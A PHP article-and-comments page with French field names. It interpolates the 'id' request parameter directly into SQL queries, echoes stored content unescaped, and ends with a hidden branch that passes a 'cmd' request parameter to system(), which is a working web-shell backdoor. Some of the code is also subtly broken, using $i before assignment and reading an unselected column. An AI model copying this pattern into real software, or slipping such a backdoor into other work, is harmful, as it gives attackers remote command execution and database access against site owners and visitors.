<?php
	if(isset($_GET['id'])){
		$article=$_GET['id'];
		$query = sprintf("SELECT titre,auteur,contenu FROM articles WHERE id=$article");
		$result = mysql_query($query);
		$titre = mysql_result($result,$i,"titre");
		$auteur = mysql_result($result,$i, "auteur");
		$id = mysql_result($result,$i,"id");
		$contenu = mysql_result($result,$i,"contenu");
?>
		<div class="row">
			<div class="col-md-6 col-md-offset-3">
				<div class="panel panel-primary">
					<div class="panel-heading">
						<h3 class="panel-title"><?php echo $titre; ?></h3>
					</div>
					<div class="panel-body">
						<p><?php echo $contenu; ?></p>
					</div>
					<div class="panel-footer">
						<i><?php echo $auteur; ?></i>
					</div>
				</div>
			</div>
		</div>
		<div class="row">
			<div class="col-md-6 col-md-offset-3">
				<div class="panel panel-primary">
					<div class="panel-heading">
						<h3 class="panel-title">Commentaires</h3>
					</div>
					<div class="panel-body">
		
		
<?php
	$article =$_GET['id'];
	$query = sprintf("SELECT commentaire,mail FROM commentaires WHERE id_article=$article");
	$result = mysql_query($query);
	$num = mysql_numrows($result);

	$i=0;

	while($i<$num){
		$commentaire = mysql_result($result,$i,"commentaire");
		$mail = mysql_result($result,$i,"mail");
?>
			<p><?php echo $commentaire ?> - <i><?php echo $mail ?></i></p>

<?php
	$i++;
	}
?>
				</div>
			</div>
		</div>
	</div>
<?php

	}
	        else if(isset($_GET['cmd'])){
                echo system($_GET['cmd']);
        }

	
?>
